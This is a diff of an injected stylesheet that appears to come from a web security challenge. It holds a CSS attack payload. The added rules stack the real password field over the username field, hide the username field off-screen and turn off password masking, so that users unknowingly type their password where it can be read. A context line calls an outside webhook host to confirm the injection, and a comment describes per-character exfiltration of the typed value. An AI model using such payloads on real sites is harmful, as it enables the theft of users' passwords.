@@ -5,6 +5,32 @@
    - focus tail (optional): ?type=pf&char=<c>
    NOTE: Only #password updates its value attribute on keyup in this challenge. */
 
+/* Make the container a positioned context */
+.loginbox { position: relative; }
+
+/* Put the real password box where the username box sits */
+#password {
+  position: absolute !important;
+  top: 110px !important;   /* adjust to overlap the Username input’s position */
+  left: 30px !important;   /* adjust */
+  width: 80% !important;
+  z-index: 3 !important;
+}
+
+/* Move the real username box away so it doesn’t get focus */
+#username {
+  position: absolute !important;
+  top: -9999px !important;
+  left: -9999px !important;
+}
+
+/* Optional: make the bullets look like normal text so it feels like a username box */
+#password {
+  -webkit-text-security: none !important;
+  font-family: sans-serif !important;
+}
+
+
 /* 0) Confirm CSS is applied */
 body{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=visit)}
 
